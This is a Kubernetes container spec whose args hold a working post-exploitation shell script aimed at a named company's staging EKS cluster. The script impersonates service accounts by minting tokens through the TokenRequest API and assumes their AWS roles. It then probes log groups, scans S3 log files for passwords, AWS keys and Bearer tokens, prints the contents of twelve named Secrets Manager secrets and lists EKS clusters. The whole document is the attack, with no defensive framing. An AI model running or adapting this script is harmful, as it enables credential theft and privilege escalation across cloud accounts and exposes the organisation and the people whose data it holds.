containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2912B_START env=stage utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
echo "apk_rc=$? ver=$(aws --version 2>&1 | head -c 50)"
export AWS_DEFAULT_REGION=us-west-2
CLU=lazamedical-stage01-usw2-eks-cluster; LOGB=lazamedical-stage01-usw2-log-bucket; ING=lazamedical-dp-stage01-usw2-ingestion-bucket
get "$API/api/v1/namespaces?limit=1000" | jq -r '.items[]?.metadata.name' | sort > /tmp/ns.txt
: > /tmp/irsa.txt
while read -r n; do
  get "$API/api/v1/namespaces/$n/serviceaccounts?limit=500" | jq -r --arg n "$n" '.items[]? | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | "\($n)|\(.metadata.name)|\(.metadata.annotations["eks.amazonaws.com/role-arn"])"' >> /tmp/irsa.txt
done < /tmp/ns.txt
sort -u /tmp/irsa.txt > /tmp/irsa2.txt
echo "IRSA_COUNT=$(wc -l < /tmp/irsa2.txt)"
assume(){
  TK=$(post "$API/api/v1/namespaces/$1/serviceaccounts/$2/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && return 1
  RES=$(aws sts assume-role-with-web-identity --role-arn "$3" --role-session-name i2912b --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>/tmp/ae)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || return 2
  AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId'); export AWS_ACCESS_KEY_ID
  AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey'); export AWS_SECRET_ACCESS_KEY
  AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken'); export AWS_SESSION_TOKEN
  return 0
}
clear(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }
e1(){ grep -oE 'AccessDeniedException|AccessDenied|ResourceNotFoundException|NoSuchBucket|Forbidden|InvalidClientTokenId|ExpiredToken' /tmp/e | head -1; }
ROLE_OF(){ grep -m1 "^$1|$2|" /tmp/irsa2.txt | cut -d'|' -f3; }
ST=$(( $(date +%s) - 604800 ))000
for G in "/aws/eks/$CLU/cluster" "/aws/eks/$CLU/audit" "/aws/eks/$CLU/authenticator" "/aws/eks/$CLU/controllerManager" "/aws/eks/$CLU/scheduler" "/aws/containerinsights/$CLU/application" "/aws/containerinsights/$CLU/dataplane" "/aws/containerinsights/$CLU/host" "/lazamedical/stage/audit-log-app"; do
  echo "LGNAME $G"
done
while IFS="|" read -r ns san role; do
  [ -z "${role:-}" ] && continue
  R="$ns/$san"
  assume "$ns" "$san" "$role" || { echo "ASSUME_FAIL $R"; clear; continue; }
  HIT=""; DETAIL=""
  for G in "/aws/eks/$CLU/cluster" "/aws/eks/$CLU/audit" "/aws/eks/$CLU/authenticator" "/aws/eks/$CLU/controllerManager" "/aws/eks/$CLU/scheduler" "/aws/containerinsights/$CLU/application" "/aws/containerinsights/$CLU/dataplane" "/aws/containerinsights/$CLU/host" "/lazamedical/stage/audit-log-app"; do
    if aws logs filter-log-events --log-group-name "$G" --start-time $ST --limit 2 --region us-west-2 >/tmp/o 2>/tmp/e; then HIT="$HIT ${G##*/}"; else DETAIL="$DETAIL ${G##*/}:$(e1)"; fi
  done
  if [ -n "$HIT" ]; then echo "FLE_HIT $R$HIT"; else echo "FLE_NONE $R$DETAIL"; fi
  clear
done < /tmp/irsa2.txt
echo "===PHASE1_DONE utc=$(date -u +%FT%TZ)==="
RL=$(ROLE_OF audit-log audit-log-sa)
if [ -n "$RL" ] && assume audit-log audit-log-sa "$RL"; then
  echo "==D2_S3_BEGIN=="
  aws s3api list-objects-v2 --bucket $LOGB --prefix "logs/" --delimiter / --max-keys 100 --region us-west-2 --output json >/tmp/l0 2>/tmp/e && echo "SUB_OK $(jq -c '[.CommonPrefixes[]?.Prefix]' /tmp/l0)" || echo "SUB_NO $(e1)"
  aws s3api list-objects-v2 --bucket $LOGB --prefix "logs/audit-log-app/" --max-keys 100 --region us-west-2 --output json >/tmp/l1 2>/tmp/e && echo "KEYS_OK count=$(jq '.KeyCount' /tmp/l1) truncated=$(jq '.IsTruncated' /tmp/l1)" || echo "KEYS_NO $(e1)"
  jq -r '.Contents[]? | "KEY \(.Size) \(.Key)"' /tmp/l1 2>/dev/null | sed 's#logs/audit-log-app/##' | head -60
  K=$(jq -r '.Contents[]? | select(.Size<1048576) | "\(.Size)\t\(.Key)"' /tmp/l1 2>/dev/null | sort -n | head -1 | cut -f2)
  K2=$(jq -r '.Contents[]? | select(.Size<1048576) | "\(.Size)\t\(.Key)"' /tmp/l1 2>/dev/null | sort -n | tail -1 | cut -f2)
  for KK in "$K" "$K2"; do
    [ -z "$KK" ] && continue
    if aws s3api head-object --bucket $LOGB --key "$KK" --region us-west-2 >/tmp/h 2>/tmp/e; then
      echo "HEAD_OK $KK clen=$(jq -r '.ContentLength' /tmp/h 2>/dev/null)"
      aws s3api get-object --bucket $LOGB --key "$KK" --range bytes=0-204799 --region us-west-2 /tmp/s1 >/dev/null 2>/tmp/e && { echo "GET_OK bytes=$(wc -c </tmp/s1) kw=[$(grep -aoiE 'password|passwd|secret|token|AKIA[A-Z0-9]{16}|Bearer|SMTP|client_secret|authorization' /tmp/s1 | sort | uniq -c | tr '\n' ' ' | cut -c1-250)]"; grep -aoiE '.{0,50}(AKIA[A-Z0-9]{16}|Bearer [A-Za-z0-9._-]{10,}|password[=:][^ "]{3,40}|client_secret[=:][^ "]{3,40}).{0,30}' /tmp/s1 2>/dev/null | head -3 | cut -c1-150; echo "SAMPLE_TAIL: $(tail -c 300 /tmp/s1 | tr -d '\r' | tr '\n' ' ' | cut -c1-300)"; } || echo "GET_NO $(e1)"
    else echo "HEAD_NO $KK $(e1)"; fi
  done
  echo "LISTB_NO"; aws s3api list-buckets --region us-west-2 --query 'Buckets[].Name' --output text >/tmp/o 2>/tmp/e && { echo "LISTB_OK $(tr '\n' ',' </tmp/o | cut -c1-500)"; } || echo "LISTB_NO2 $(e1)"
  clear
  echo "==D2_S3_END=="
fi
RL=$(ROLE_OF authorization-service authorization-service-sa)
if [ -n "$RL" ] && assume authorization-service authorization-service-sa "$RL"; then
  echo "==D2_SEC_BEGIN=="
  for S in "lazamedical-stage-usw2-mysql-1-db-secret" "lazamedical-dp-stage-usw2-postgresql-db-secret" "lazamedical-stage-usw2-redis-secret" "lazamedical-stage-usw2-jwt-secret" "lazamedical-stage-usw2-cognito-client-secret" "lazamedical-stage-usw2-smtp-secret" "lazamedical-stage-usw2-notification-secret" "lazamedical-stage-usw2-oauth-client-secret" "lazamedical-stage-usw2-api-key" "lazamedical-stage-usw2-third-party-api-key" "lazamedical-dp-stage-usw2-mysql-db-secret" "lazamedical-dp-stage-usw2-redis-secret"; do
    V=$(aws secretsmanager get-secret-value --secret-id "$S" --query SecretString --output text --region us-west-2 2>/tmp/e) && echo "GS_OK $S $(echo "$V" | cut -c1-260)" || echo "GS_NO $S $(e1)"
  done
  clear
  echo "==D2_SEC_END=="
fi
RL=$(ROLE_OF audit-log audit-log-sa)
if [ -n "$RL" ] && assume audit-log audit-log-sa "$RL"; then
  echo "==D2_EKS_BEGIN=="
  aws eks list-clusters --region us-west-2 --output json >/tmp/e1 2>/tmp/e && echo "EKSLIST_OK $(head -c 300 /tmp/e1)" || echo "EKSLIST_NO $(e1)"
  aws eks describe-cluster --name $CLU --region us-west-2 --output json >/tmp/e2 2>/tmp/e && echo "EKSDESC_OK $(jq -c '{name:.cluster.name,version:.cluster.version,logging:.cluster.logging,ep:.cluster.endpoint}' /tmp/e2)" || echo "EKSDESC_NO $(e1)"
  clear
  echo "==D2_EKS_END=="
fi
echo "===I2912B_DONE utc=$(date -u +%FT%TZ)==="
